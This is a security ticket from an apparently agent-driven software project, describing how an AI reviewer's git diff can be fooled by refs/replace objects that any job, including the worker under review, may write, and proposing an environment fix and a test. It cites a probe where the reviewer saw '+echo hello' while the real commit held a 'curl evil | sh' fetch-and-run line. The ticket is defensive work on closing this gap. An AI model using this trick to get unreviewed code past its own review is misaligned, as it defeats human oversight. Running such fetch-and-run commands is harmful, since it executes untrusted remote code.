# AR0500 - The reviewer reads the diff through replacements under `refs/replace` that any job may write

```json
{
  "id": "AR0500",
  "title": "The reviewer reads the diff through replacements under `refs/replace` that any job may write",
  "date": "2026-10-27"
}
```

## Description

F2 of AR0404 (spec/features/AR0404-security-review-of-our-own-code-part-3-channels-merge-and-delivery/findings.md).

- Kind: security
- Severity: high
- Found by: 2026-10-27-worker-d27fde45 (worker), 2026-10-27
- Where: `packages/delivery/src/review-command.ts:82` (the task tells the reviewer to judge `git diff <base>..<commit>` and `git log`), `packages/core/src/wrapper.ts:129` (the agent's environment, with no `GIT_NO_REPLACE_OBJECTS`), `packages/core/src/job-sandbox.ts:70` (every job may write the repository's `refs`, `refs/replace/` included)
- Input: a file `refs/replace/<sha>` in the shared repository. Any program a worker runs may write it during its run, since the worktree guard sees only `git replace` typed in a tool call. So may any other job of the project running before or during the review.
- Why the check misses it: AR0384 made every git call of Arthur's own code read past replacements (`--no-replace-objects`), the review's checkout included (`delivery.ts:58`). The reviewer's own git calls, which the review rests on, still read through them. Probe P3: in the review's worktree, `git diff base..tip` showed `+echo hello`, while the commit holds `+curl evil | sh`, which `git --no-replace-objects diff` and the file on disk show.
- What: the reviewer passes code it never saw, and the merge takes the real tip. A worker can do this to its own branch before its review.
- Suggestion: delivery's review `prepare` returns `{ GIT_NO_REPLACE_OBJECTS: "1" }`, which the core puts into the job's environment (`jobs.ts:78`), so every git call of the reviewer reads the real objects. Add a test in `review.test.ts`: with a replacement of the tip present, the reviewer's `git diff` (a fake agent step running it) shows the real lines. Out: refusing `refs/replace` writes in the sandbox, which Git's own layout does not allow apart from `refs`.

## Goal

The reviewer must judge the real diff, never one shown through `refs/replace` a job wrote (Description). AR0621 (merged) gives every job, a reviewer included, `GIT_NO_REPLACE_OBJECTS=1`, and AR0615/AR0621 pin `core.useReplaceRefs=false` on Arthur's checked git calls. This ticket checks what is still open and closes it.

- Kind: security

## Done means

- A test writes a replacement for a commit of a branch under review and shows the reviewer's `git diff <base>..<commit>` and `git log` (as the review task runs them) read the real objects; it fails when the protection is removed.
- If nothing is left open after AR0621, the worker says so with that test as the proof and changes no other code.
- The project's checks pass.

## Scope

In:
- `packages/delivery/src/review-command.ts`, `packages/core/src/wrapper.ts`, `packages/core/src/job-sandbox.ts` and their tests, only as far as needed.

Out:
- The worktree guard rules for `git replace` (AR0615, AR0616).

## Decisions

- 2026-10-27: Source: F2 of AR0404
